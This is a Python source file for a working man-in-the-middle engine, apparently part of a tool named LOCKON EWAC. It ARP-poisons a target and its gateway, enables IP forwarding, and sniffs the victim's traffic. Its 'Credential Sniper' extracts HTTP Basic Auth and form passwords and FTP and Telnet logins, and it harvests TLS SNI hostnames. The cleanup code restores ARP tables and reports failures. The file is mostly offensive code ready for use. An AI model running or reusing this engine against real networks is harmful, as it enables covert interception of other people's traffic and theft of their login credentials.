import threading
import time
import socket
import os
import platform
import subprocess
from scapy.all import sniff, send, sendp, Ether, ARP, DNS, IP, TCP, Raw, PcapWriter
import logging

class MitmEngine:
    def __init__(self, emit_cb):
        self.emit = emit_cb
        self.active_attacks = {}   # target_ip -> True/False
        self._attack_info = {}     # target_ip -> {target_mac, gateway_mac, gateway_ip, interface}
        self.lock = threading.Lock()
        self.logger = logging.getLogger("MitmEngine")
        #: Targets currently relying on IP forwarding being on.
        #:
        #: `Set-NetIPInterface -Forwarding Disabled` is machine-wide, and teardown
        #: of one target used to call it unconditionally. With two sessions running
        #: -- the module is keyed per target and has a `stop_all` -- stopping the
        #: first blackholed the second victim's traffic while that session carried
        #: on poisoning and emitting `mitm_packet`, reporting nothing wrong. So it
        #: is refcounted: the last one out turns it off.
        self._forwarding_for = set()

    # ── IP Forwarding Control ──
    def _is_admin(self):
        """Best-effort Administrator / root check (used to explain failures)."""
        try:
            if platform.system().lower() == "windows":
                import ctypes
                return bool(ctypes.windll.shell32.IsUserAnAdmin())
            return os.geteuid() == 0
        except Exception:
            return False

    def _set_ip_forwarding(self, enable):
        """Toggle IP forwarding. Returns (ok: bool, message: str).

        Failures are returned, never swallowed: without forwarding the MITM
        silently blackholes the victim's traffic, so the operator must be told.
        """
        state = "Enabled" if enable else "Disabled"
        try:
            if platform.system().lower() == "windows":
                # No -ErrorAction SilentlyContinue: we need to see the failure.
                proc = subprocess.run(
                    ["powershell", "-Command",
                     f"$ErrorActionPreference='Stop'; "
                     f"Set-NetIPInterface -Forwarding {state} -PolicyStore ActiveStore"],
                    capture_output=True, timeout=10,
                    creationflags=0x08000000
                )
                if proc.returncode != 0:
                    err = (proc.stderr or b"").decode("utf-8", errors="ignore").strip()
                    detail = err.splitlines()[0] if err else f"exit code {proc.returncode}"
                    if not self._is_admin():
                        detail += (" — LOCKON EWAC is NOT running as Administrator; "
                                   "Set-NetIPInterface requires elevation. Restart elevated.")
                    return False, f"Could not set IP forwarding to {state}: {detail}"
                self.logger.info(f"IP forwarding {state.lower()} (Windows)")
            else:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("1" if enable else "0")
                self.logger.info(f"IP forwarding {state.lower()} (Linux)")
            return True, f"IP forwarding {state.lower()}"
        except PermissionError as e:
            return False, (f"Could not set IP forwarding to {state}: permission denied "
                           f"— root/Administrator rights are required ({e})")
        except Exception as e:
            return False, f"Could not set IP forwarding to {state}: {e}"

    def _enable_ip_forwarding(self, target_ip=None):
        """Enable IP forwarding so spoofed traffic is routed through us."""
        ok, message = self._set_ip_forwarding(True)
        if not ok:
            self.logger.warning(message)
        elif target_ip:
            with self.lock:
                self._forwarding_for.add(target_ip)
        return ok, message

    def _release_ip_forwarding_claim(self, target_ip):
        """
        Drop this target's claim without touching the machine-wide setting.

        Needed because the claim is taken the moment forwarding is turned on, while the
        release sits inside the teardown's `if poisoning_started:`. A start that failed
        between those two points -- a `PcapWriter` raising on a bad `captures/` path is
        the realistic one -- left the address in the set forever, and because
        `_disable_ip_forwarding` short-circuits while the set is non-empty, *every*
        later teardown then reported "IP forwarding left on: still required by ..." and
        never turned it off. The machine stayed a router for the rest of the process,
        which is strictly worse than the unrefcounted behaviour this replaced.
        """
        with self.lock:
            self._forwarding_for.discard(target_ip)

    def _disable_ip_forwarding(self, target_ip=None):
        """
        Release this target's claim on IP forwarding; turn it off when it is the last.

        The setting is machine-wide, so turning it off for one target cut the route
        out from under every other session still poisoning. The victim of the second
        session lost all traffic while the engine reported the attack as running.
        """
        if target_ip is not None:
            with self.lock:
                self._forwarding_for.discard(target_ip)
                still_needed = sorted(self._forwarding_for)
            if still_needed:
                return True, (
                    "IP forwarding left on: still required by "
                    f"{', '.join(still_needed)}."
                )
        ok, message = self._set_ip_forwarding(False)
        if not ok:
            self.logger.warning(message)
        return ok, message

    def _get_mac(self, ip, interface=None):
        try:
            from scapy.all import getmacbyip, srp, Ether
            mac = getmacbyip(ip)
            if mac:
                return mac
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=2, verbose=False, iface=interface)
            for snd, rcv in ans:
                return rcv[Ether].src
            return None
        except Exception as e:
            self.logger.error(f"Failed to get MAC for {ip}: {e}")
            return None

    def _restore_arp(self, target_ip):
        """Send correct ARP responses to restore target and gateway ARP tables.

        Returns True if at least one restore round was delivered.
        Raises if every send path failed on every round — a silent failure here
        leaves the victim permanently poisoned, so it must reach the operator.
        """
        info = self._attack_info.get(target_ip)
        if not info:
            return False

        target_mac = info["target_mac"]
        gateway_mac = info["gateway_mac"]
        gateway_ip = info["gateway_ip"]
        iface = info.get("interface")

        arp_restore_target = Ether(dst=target_mac) / ARP(
            op=2, pdst=target_ip, psrc=gateway_ip,
            hwdst=target_mac, hwsrc=gateway_mac
        )
        arp_restore_gateway = Ether(dst=gateway_mac) / ARP(
            op=2, pdst=gateway_ip, psrc=target_ip,
            hwdst=gateway_mac, hwsrc=target_mac
        )

        delivered = 0
        last_error = None
        # Send multiple times to ensure delivery
        for _ in range(5):
            try:
                try:
                    sendp(arp_restore_target, verbose=False, iface=iface)
                    sendp(arp_restore_gateway, verbose=False, iface=iface)
                except Exception:
                    # Fallback 1: sendp without iface
                    sendp(arp_restore_target, verbose=False)
                    sendp(arp_restore_gateway, verbose=False)
                delivered += 1
            except Exception as e:
                # Fallback 2: Layer 3 auto-routing
                try:
                    from scapy.all import send
                    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac), verbose=False)
                    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target_mac), verbose=False)
                    delivered += 1
                except Exception as e2:
                    last_error = e2
                    self.logger.error(f"ARP restore round failed for {target_ip}: {e} / {e2}")
            time.sleep(0.2)

        if delivered == 0:
            raise RuntimeError(
                f"Every ARP restore attempt for {target_ip} failed: {last_error}"
            )

        self.logger.info(f"ARP tables restored for {target_ip} <-> {gateway_ip}")
        return True

    def start_mitm(self, target_ip, gateway_ip, interface=None, save_pcap=False):
        with self.lock:
            if target_ip in self.active_attacks and self.active_attacks[target_ip]:
                self.emit("mitm_error", {"target": target_ip, "message": "MITM attack already running for this target."})
                return
            self.active_attacks[target_ip] = True

        def run_attack():
            pcap_writer = None
            pcap_filename = None
            spoof_thread = None
            poisoning_started = False
            arp_restored = False

            try:
                self.emit("mitm_started", {"target": target_ip, "message": f"Resolving MAC addresses..."})

                target_mac = self._get_mac(target_ip, interface)
                gateway_mac = self._get_mac(gateway_ip, interface)

                if not target_mac:
                    self.emit("mitm_error", {"target": target_ip, "message": f"Could not resolve MAC for target {target_ip}"})
                    return

                if not gateway_mac:
                    self.emit("mitm_error", {"target": target_ip, "message": f"Could not resolve MAC for gateway {gateway_ip}"})
                    return

                # Store attack info for ARP restore later
                self._attack_info[target_ip] = {
                    "target_mac": target_mac,
                    "gateway_mac": gateway_mac,
                    "gateway_ip": gateway_ip,
                    "interface": interface,
                }

                # Enable IP forwarding so traffic flows through us.
                # Without it the victim's traffic is blackholed — never hide this.
                fwd_ok, fwd_message = self._enable_ip_forwarding(target_ip)
                if not fwd_ok:
                    self.emit("mitm_error", {
                        "target": target_ip,
                        "message": f"{fwd_message} The victim's traffic will be blackholed "
                                   f"(no onward routing) until this is fixed.",
                    })

                if save_pcap:
                    os.makedirs("captures", exist_ok=True)
                    pcap_filename = os.path.join("captures", f"mitm_{target_ip.replace('.', '_')}_{int(time.time())}.pcap")
                    pcap_writer = PcapWriter(pcap_filename, append=True, sync=True)
                    self.emit("mitm_progress", {"target": target_ip, "message": f"Saving traffic to {pcap_filename}"})

                self.emit("mitm_progress", {"target": target_ip, "message": f"Spoofing started! Target MAC: {target_mac}, Gateway MAC: {gateway_mac}"})

                # From here on the victim's ARP table gets poisoned: cleanup is mandatory.
                poisoning_started = True

                # Create ARP responses (Layer 2)
                arp_poison_target = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
                arp_poison_gateway = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)

                def spoof_loop():
                    while self.active_attacks.get(target_ip):
                        try:
                            try:
                                sendp(arp_poison_target, verbose=False, iface=interface)
                                sendp(arp_poison_gateway, verbose=False, iface=interface)
                            except Exception:
                                # Fallback 1: sendp without iface
                                sendp(arp_poison_target, verbose=False)
                                sendp(arp_poison_gateway, verbose=False)
                        except Exception as e:
                            # Fallback 2: L3 auto-routing
                            try:
                                from scapy.all import send
                                send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=False)
                                send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=False)
                            except Exception as e2:
                                self.logger.error(f"Spoofing loop failed completely: {e2}")
                        time.sleep(2)

                def packet_handler(pkt):
                    if not self.active_attacks.get(target_ip):
                        return
                
                    if IP in pkt:
                        src = pkt[IP].src
                        dst = pkt[IP].dst
                    
                        if src != target_ip and dst != target_ip:
                            return
                    
                        if pcap_writer:
                            pcap_writer.write(pkt)

                        info = None
                        protocol = "Unknown"
                    
                        if DNS in pkt and pkt.haslayer("DNSQR"):
                            protocol = "DNS"
                            query = pkt["DNSQR"].qname.decode('utf-8', errors='ignore').rstrip('.')
                            info = f"DNS Query: {query}"
                    
                        elif TCP in pkt and Raw in pkt:
                            payload = pkt[Raw].load
                        
                            # 1. HTTP Traffic (Port 80)
                            if pkt[TCP].dport == 80 or pkt[TCP].sport == 80:
                                payload_str = payload.decode('utf-8', errors='ignore')
                                if "HTTP" in payload_str:
                                    protocol = "HTTP"
                                    lines = payload_str.split('\r\n')
                                    request_line = lines[0] if lines else ""
                                    host = next((line.split(':', 1)[1].strip() for line in lines if line.lower().startswith("host:")), "")
                                
                                    # Credential Sniper
                                    creds = []
                                    for line in lines:
                                        if line.lower().startswith("authorization: basic"):
                                            import base64
                                            try:
                                                b64_str = line.split(" ")[2]
                                                decoded = base64.b64decode(b64_str).decode('utf-8')
                                                creds.append(f"BasicAuth[{decoded}]")
                                            except Exception:
                                                pass
                                        elif "user=" in line.lower() or "password=" in line.lower() or "pass=" in line.lower():
                                            creds.append(f"FormData[{line[:50]}]")
                                
                                    cred_str = " | [CREDENTIALS] " + ", ".join(creds) if creds else ""
                                    info = f"{request_line} | {host}{cred_str}"
                                
                            # 2. FTP Traffic (Port 21) -> Credential Sniper
                            elif pkt[TCP].dport == 21 or pkt[TCP].sport == 21:
                                protocol = "FTP"
                                payload_str = payload.decode('utf-8', errors='ignore').strip()
                                if payload_str.upper().startswith("USER "):
                                    info = f"FTP Login -> [CREDENTIALS] Username: {payload_str[5:]}"
                                elif payload_str.upper().startswith("PASS "):
                                    info = f"FTP Login -> [CREDENTIALS] Password: {payload_str[5:]}"
                                elif payload_str:
                                    info = f"FTP Cmd: {payload_str[:50]}"
                                
                            # 3. Telnet Traffic (Port 23) -> Credential Sniper
                            elif pkt[TCP].dport == 23 or pkt[TCP].sport == 23:
                                protocol = "Telnet"
                                payload_str = payload.decode('utf-8', errors='ignore').strip()
                                # Telnet often sends char-by-char, but we log basic chunks
                                if "login:" in payload_str.lower() or "password:" in payload_str.lower():
                                    info = f"Telnet Prompt -> {payload_str[:50]}"
                                elif len(payload_str) > 0 and len(payload_str) < 20:
                                    # Heuristic for capturing telnet input
                                    info = f"Telnet Input -> {payload_str}"
                                
                            # 4. HTTPS/TLS Traffic (Port 443) -> SNI Harvester
                            elif pkt[TCP].dport == 443:
                                protocol = "HTTPS"
                                # Fast manual SNI extraction without scapy.tls overhead
                                try:
                                    if len(payload) > 43 and payload[0] == 0x16 and payload[5] == 0x01:
                                        import struct
                                        pos = 43 # 5 (TLS header) + 4 (Handshake) + 2 (Version) + 32 (Random)
                                        session_id_length = payload[pos]
                                        pos += 1 + session_id_length
                                        cipher_suites_length = struct.unpack(">H", payload[pos:pos+2])[0]
                                        pos += 2 + cipher_suites_length
                                        compression_methods_length = payload[pos]
                                        pos += 1 + compression_methods_length
                                        if pos + 2 <= len(payload):
                                            extensions_length = struct.unpack(">H", payload[pos:pos+2])[0]
                                            pos += 2
                                            end_pos = pos + extensions_length
                                            while pos + 4 <= end_pos and pos + 4 <= len(payload):
                                                ext_type = struct.unpack(">H", payload[pos:pos+2])[0]
                                                ext_length = struct.unpack(">H", payload[pos+2:pos+4])[0]
                                                pos += 4
                                                if ext_type == 0x0000: # SNI Extension
                                                    name_type = payload[pos+2]
                                                    if name_type == 0:
                                                        name_len = struct.unpack(">H", payload[pos+3:pos+5])[0]
                                                        server_name = payload[pos+5:pos+5+name_len].decode('utf-8')
                                                        info = f"TLS Client Hello -> [SNI] {server_name}"
                                                        break
                                                pos += ext_length
                                except Exception:
                                    pass
                            
                                if not info:
                                    info = f"Encrypted traffic to {dst}" if src == target_ip else f"Encrypted traffic from {src}"

                        if info:
                            # Log high value intercepts
                            if "[CREDENTIALS]" in info or "[SNI]" in info:
                                self.logger.info(f"[INTERCEPT] {src} -> {dst} : {info}")
                            
                            self.emit("mitm_packet", {
                                "target": target_ip,
                                "src": src,
                                "dst": dst,
                                "protocol": protocol,
                                "info": info,
                                "timestamp": time.time()
                            })

                spoof_thread = threading.Thread(target=spoof_loop, daemon=True)
                spoof_thread.start()

                # Sniff in bounded slices. stop_filter is only evaluated when a
                # packet arrives, so on a quiet link a single unbounded sniff()
                # would never return and cleanup would never run.
                while self.active_attacks.get(target_ip):
                    try:
                        sniff(
                            filter=f"host {target_ip}",
                            prn=packet_handler,
                            store=0,
                            iface=interface,
                            timeout=1,
                            stop_filter=lambda x: not self.active_attacks.get(target_ip),
                        )
                    except Exception as e:
                        self.emit("mitm_error", {"target": target_ip, "message": f"Sniffer error: {e}"})
                        break

            finally:
                # Cleanup runs on EVERY exit path, including exceptions.
                #
                # The forwarding claim is released here, unconditionally, and not
                # inside the `if poisoning_started:` branch below -- a start that
                # failed between turning forwarding on and poisoning anything used to
                # leave the address claimed forever, which then prevented every later
                # teardown from turning forwarding off at all.
                self._release_ip_forwarding_claim(target_ip)
                # Stop the poisoning loop first so it cannot re-poison mid-restore.
                with self.lock:
                    if target_ip in self.active_attacks:
                        self.active_attacks[target_ip] = False
                if spoof_thread is not None:
                    spoof_thread.join(timeout=3)

                if pcap_writer:
                    try:
                        pcap_writer.close()
                        self.emit("mitm_progress", {"target": target_ip, "message": f"PCAP saved successfully: {pcap_filename}"})
                    except Exception as e:
                        self.emit("mitm_error", {"target": target_ip, "message": f"Failed to close PCAP {pcap_filename}: {e}"})

                if poisoning_started:
                    # Restore ARP tables when attack ends
                    try:
                        arp_restored = self._restore_arp(target_ip)
                    except Exception as e:
                        arp_restored = False
                        self.emit("mitm_cleanup_failed", {
                            "target": target_ip,
                            "arp_restored": False,
                            "message": f"ARP restore FAILED for {target_ip}: {e}. The victim's ARP "
                                       f"table is STILL POISONED — clear its ARP cache or reboot the host.",
                        })

                    fwd_off_ok, fwd_off_message = self._disable_ip_forwarding(target_ip)
                    if not fwd_off_ok:
                        self.emit("mitm_error", {"target": target_ip, "message": fwd_off_message})
                else:
                    # No poisoning took place, so there is nothing to restore.
                    arp_restored = True

                self._cleanup_attack(target_ip)

                # mitm_stopped is emitted only AFTER restoration was attempted.
                self.emit("mitm_stopped", {
                    "target": target_ip,
                    "arp_restored": arp_restored,
                    "message": ("MITM attack stopped. ARP tables restored."
                                if arp_restored else
                                "MITM attack stopped, but ARP RESTORATION FAILED — "
                                "the target may still be poisoned."),
                })

        attack_thread = threading.Thread(target=run_attack, daemon=True)
        attack_thread.start()

    def stop_mitm(self, target_ip):
        """Request a stop. ``mitm_stopped`` is emitted by the attack thread only
        after the ARP restore has actually been attempted.

        A stop for a target that is not running is reported rather than dropped.
        This had no else branch, so an unknown address was a silent no-op: no
        event of any kind came back, and the caller had no way to distinguish
        "stopping" from "that request went nowhere". Combined with a UI that sent
        whichever host was selected, it meant a spoof could be left running with
        the interface insisting it had been stopped. An ARP table this tool
        poisoned is somebody else's network, so a stop that does nothing has to
        say so.
        """
        with self.lock:
            if target_ip in self.active_attacks:
                self.active_attacks[target_ip] = False
                self.emit("mitm_progress", {"target": target_ip, "message": "Stop requested. Restoring ARP tables..."})
                return

            running = sorted(self.active_attacks)
            self.emit("mitm_error", {
                "target": target_ip,
                "message": (
                    f"No interception is running against {target_ip}, so nothing was "
                    "stopped." + (
                        f" Still running against: {', '.join(running)}."
                        if running else
                        " No interception is running against any target."
                    )
                ),
            })

    def _cleanup_attack(self, target_ip):
        """Remove attack info after full cleanup."""
        with self.lock:
            self.active_attacks.pop(target_ip, None)
            self._attack_info.pop(target_ip, None)
                
    def forwarding_claims(self):
        """Targets currently holding IP forwarding on. For tests and diagnostics."""
        with self.lock:
            return set(self._forwarding_for)

    def stop_all(self):
        with self.lock:
            for target in list(self.active_attacks.keys()):
                self.active_attacks[target] = False
